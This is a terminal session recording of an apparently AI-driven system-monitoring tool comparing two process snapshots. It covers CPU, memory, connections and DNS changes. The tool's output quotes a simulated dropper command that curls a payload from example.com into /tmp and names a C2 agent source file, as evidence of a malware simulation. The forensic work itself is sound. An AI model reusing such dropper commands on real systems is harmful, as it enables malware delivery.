[0.451, "o", "\u001b[H\n \u001b[1;38;2;0;255;136myou❯ \u001b[0mmain differences between that snapshot and this one, i just loaded it.                                                   \u001b[K\r\n \u001b[1;38;2;255;68;68mgodshell❯ \u001b[0m\u001b[38;2;204;204;204mBiggest difference is the suspicious interactive ./godshell is gone in this loaded snapshot. Evidence: prior\u001b[m        \u001b[K\r\n \u001b[38;2;204;204;204msnapshot had active PID 14888 under zsh -> kitty with 21.4% CPU and outbound HTTPS to 104.18.3.115:443 and\u001b[m                    \u001b[K\r\n \u001b[38;2;204;204;204m142.251.154.119:443 from inspect(14888)/family(14888); current loaded snapshot instead shows active ./godshell at PIDs\u001b[m        \u001b[K\r\n \u001b[38;2;204;204;204m250968 and 261617 with only light DoT traffic to 1.1.1.1:853 from summary and inspect(250968)/inspect(261617).\u001b[0m                \u001b[K\r\n \u001b[38;2;204;204;204m\u001b[0m                                                                                                                              \u001b[K\r\n \u001b[38;2;204;204;204mAntigravity became far noisier and heavier in the loaded snapshot. Evidence: prior PID 4402 had 511700 KB memory, 339\u001b[m         \u001b[K\r\n \u001b[38;2;204;204;204mconnections, and modest file effects in inspect(4402); current PID 4402 has 1084072 KB memory, 52471 connections, repeated\u001b[m    \u001b[K\r\n \u001b[38;2;204;204;204mopens across /home/raul/Desktop/projects/godshell and ~/.gemini/antigravity, and much larger remote footprint from\u001b[m            \u001b[K\r\n \u001b[38;2;204;204;204msummary/inspect(4402).\u001b[0m                                                                                                        \u001b[K\r\n \u001b[38;2;204;204;204m\u001b[0m                                                                                                                              \u001b[K\r\n \u001b[38;2;204;204;204msystemd-resolved changed DNS behavior significantly. Evidence: prior snapshot PID 430 showed 1647 connections with mixed DNS\u001b[m  \u001b[K\r\n \u001b[38;2;204;204;204mquery activity and 1.1.1.1:853 from summary; current loaded snapshot PID 430 shows only 9 connections, all to 1.1.1.1:853,\u001b[m    \u001b[K\r\n \u001b[38;2;204;204;204mfrom summary.\u001b[0m                                                                                                                 \u001b[K\r\n \u001b[38;2;204;204;204m\u001b[0m                                                                                                                              \u001b[K\r\n \u001b[38;2;204;204;204mChrome activity is much higher now. Evidence: prior chrome root PID 2649 had 28345 opens and 894 connections; current chrome\u001b[m  \u001b[K\r\n \u001b[38;2;204;204;204mroot PID 2649 is absent from top groups while electron/Antigravity and other user activity dominate, and the loaded snapshot\u001b[m  \u001b[K\r\n \u001b[38;2;204;204;204mhas a much larger electron group plus more recent exited shell/helpers. Source: both summary outputs.\u001b[0m                         \u001b[K\r\n \u001b[38;2;204;204;204m\u001b[0m                                                                                                                              \u001b[K\r\n \u001b[38;2;204;204;204mThe loaded snapshot also contains much more live shell/process churn. Evidence: prior recently_exited only had three \u001b[m         \u001b[K\r\n \u001b[38;2;204;204;204msystemd-userwork entries; current loaded snapshot has many short-lived hyprctl, logger, git, curl, cliphist, starship, and\u001b[m    \u001b[K\r\n \u001b[38;2;204;204;204mzsh entries, including curl PID 261720. Source: both summary.recently_exited.\u001b[0m                                                 \u001b[K\r\n \u001b[38;2;204;204;204m\u001b[0m                                                                                                                              \u001b[K\r\n \u001b[38;2;204;204;204mThe shell-history-backed malware simulation persists across context, but only the loaded snapshot lines up with the short-\u001b[m    \u001b[K\r\n \u001b[38;2;204;204;204mlived curl/dropper activity in the recent exits and family tree. Evidence: goread_shell_history showed /tmp c2_agent.c,\u001b[m       \u001b[K\r\n \u001b[38;2;204;204;204m/tmp/zsh_copy, and curl to /tmp/payload; current loaded snapshot has recent curl PID 261720 and family entry bash -c curl -s\u001b[m  \u001b[K\r\n \u001b[38;2;204;204;204mhttps://example.com/payload -"]
[0.000, "o", "o /tmp/payload, while the older snapshot did not expose that recent-exit set. Source:\u001b[m            \u001b[K\r\n \u001b[38;2;204;204;204mgoread_shell_history, prior family(261617), current summary.recently_exited.\u001b[0m                                                  \u001b[K\r\n \u001b[1;38;2;0;255;136myou❯ \u001b[0mgive me the timestamps of the two snapshots.                                                                             \u001b[K\r\n   \u001b[38;2;255;68;68m∙●∙\u001b[0m \u001b[3;38;2;255;102;85mScanning system snapshot...\u001b[0m                                                                                             \u001b[K\r\n \u001b[1;38;2;0;255;136m❯ \u001b[0m\u001b[7ma\u001b[0m\u001b[38;5;240msk godshell something...\u001b[0m                                                                                                   \u001b[K\r\n \u001b[38;2;85;85;85mCtrl+([r]efresh [s]ave [l]oad [p]anel) type help for more info, Esc to toggle focus\u001b[0m\u001b[38;2;68;68;68m 100%\u001b[0m                                      \u001b[K\r\n \u001b[38;2;0;255;136m[sel:/usr/lib/systemd/systemd-resolved/430]\u001b[0m                                                                                   \u001b[K\u001b[34;H"]
